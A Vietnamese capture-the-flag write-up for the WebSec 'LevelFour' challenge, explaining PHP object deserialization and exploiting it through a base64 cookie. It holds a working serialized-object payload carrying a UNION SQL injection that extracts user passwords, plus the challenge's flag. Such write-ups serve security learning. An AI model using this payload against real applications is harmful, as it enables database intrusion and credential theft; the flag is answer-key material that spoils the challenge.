# LevelFour - Cereal is nation
>PHP Object Injection_Sql cookie (deserialization php)
>
## Các định nghĩa cơ bản 
- Hàm hỗ trợ **Deserialization** đối tượng là unserialize( ) 
Input là một chuỗi đại diện cho object
Output là object được xây dựng lại từ chuỗi truyền vào hàm unserialize( )

- Hàm hỗ trợ **Serialization** đối tượng là serialize( )
Input của hàm này là một object 
Output của hàm sẽ là một chuỗi lưu object đó => cụ thể sẽ lưu class của object và các thuộc tính của object


## Cách khai thác 

Để khai thác được lỗ hổng PHP deserialization cần có 2 điều kiện :
  + Class phải sử dụng 1 trong 3 hàm **__wakeup(), __destruct(), __toString,__construct()**  để xử lý dữ liệu người dùng
  + Người dùng có thể chèn dữ liệu độc hại vào hàm unserialize() => **$_GET , $_POST , $_COOKIE , $_SESSION** 

Trong đó :

**__wakeup ( )**     : được thực thi khi một object được gọi dậy

**__destruct ( )**   : một trình hủy được gọi khi đối tượng bị hủy hoặc tập lệnh bị dừng hoặc thoát, PHP tự động gọi hàm này ở cuối tập lệnh (nếu được thiết lập)

**__construct ( )**  : cho phép người dùng khởi tạo các thuộc tính của một đối tượng khi tạo đối tượng, PHP sẽ tự động gọi hàm này khi tạo một đối tượng từ một lớp(class) 

## Bắt đầu khai thác 
Đề bài cho ta đầu vào là id và 2 source code :

### Cookie 

Khi nhập `id = 1` ta nhận được cookie 

![des](https://github.com/tinasahara1/Study/blob/e13f570adb7561eb9ef2c591d6c64dbaf6276c52/WebSec/image/des_cookie.PNG)

Decode Base64 `YToxOntzOjI6ImlwIjtzOjE0OiIxNzEuMjUwLjE2Mi45MCI7fQ==` ==> `a:1:{s:2:"ip";s:14:"171.250.162.90";}`

### Source code 1 : 

![des](https://github.com/tinasahara1/Study/blob/3e044e4600b730ed821cf47d1012566e7c143658/WebSec/image/des1.png)

=> Ta thấy được dấu hiệu của lỗ hổng và biến của cookie `$_COOKIE['leet_hax0r']` => Thão đk2
```php
 $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));
```

### Source code 2 : 

![des](https://github.com/tinasahara1/Study/blob/3e044e4600b730ed821cf47d1012566e7c143658/WebSec/image/des2.PNG)

=> Ta cũng thấy được hàm `__construct() và __destruct() ` được thiết lập => Thão đk1

Cả 2 điều kiện đều thõa mãn => Phân tích source2 và tạo payload thuii 
Chúng ta cần tạo 1 object SQL trong unserialize và truy vấn đến biến $query => Tạo SQLi dựa vào lệnh sql cho trước `$sql->query = 'SELECT username FROM users WHERE id=';` 
```sql
O:3:"SQL":1:{s:5:"query";s:81:"select username from users where id=1 union select password from users where id=1";}
```
Sau đó encode base64 nó ra 
`TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6ODE6InNlbGVjdCB1c2VybmFtZSBmcm9tIHVzZXJzIHdoZXJlIGlkPTEgdW5pb24gc2VsZWN0IHBhc3N3b3JkIGZyb20gdXNlcnMgd2hlcmUgaWQ9MSI7fQ==`

![des](https://github.com/tinasahara1/Study/blob/3e044e4600b730ed821cf47d1012566e7c143658/WebSec/image/des_flag.PNG)
Flag: `WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}`

